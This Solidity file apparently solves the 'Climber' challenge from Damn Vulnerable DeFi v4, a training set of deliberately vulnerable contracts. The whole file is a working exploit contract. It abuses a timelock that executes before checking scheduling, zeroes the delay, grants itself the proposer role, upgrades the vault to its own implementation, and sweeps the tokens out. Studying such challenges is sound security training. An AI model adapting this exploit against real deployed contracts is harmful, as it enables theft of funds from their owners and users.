// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;
import {ClimberTimelock, PROPOSER_ROLE} from "./ClimberTimelock.sol";
import {ClimberVault} from "./ClimberVault.sol";
import {NewClimberVault} from "./NewClimberVault.sol";

contract AttackClimberVault {
    address recovery;
    ClimberTimelock timelock;
    NewClimberVault vault;
    address token;
    address[] targets;
    uint256[] values;
    bytes[] dataElements;

    constructor(
        address _recovery,
        address _timelock,
        address _vault,
        address _token
    ) {
        recovery = _recovery;
        timelock = ClimberTimelock(payable(_timelock));
        vault = NewClimberVault(payable(_vault));
        token = _token;
    }

    function attack() external {
        // deploy new implementation of ClimberVault which overwrites the storage so the attacker becomes the sweeper
        NewClimberVault newClimberVault = new NewClimberVault();

        // call ClimberTimelock->execute with a few calls included:

        // 1. call updateDelay and set it to 0
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", 0));

        // 2. add a proposer (timelock is the admin so it can add one and also itself if necessary)
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                PROPOSER_ROLE,
                address(this)
            )
        );

        // 3. upgrade the vault by setting the implementation to the new contract which overwrites the sweeper function
        targets.push(address(vault));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(newClimberVault),
                ""
            )
        );

        // 4. schedule these calls while being the proposer using our own function in this contract. 
        // If we encode the call directly the last value of dataElements will not be included yet so there would be a revert because of the array length mismatch
        targets.push(address(this));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "schedule()"
            )
        );

        timelock.execute(targets, values, dataElements, keccak256("0"));

        // sweep the funds from the contract
        vault.sweepFunds(token, recovery);
    }

    function schedule() external{
        timelock.schedule(targets, values, dataElements, keccak256("0"));
    }
}
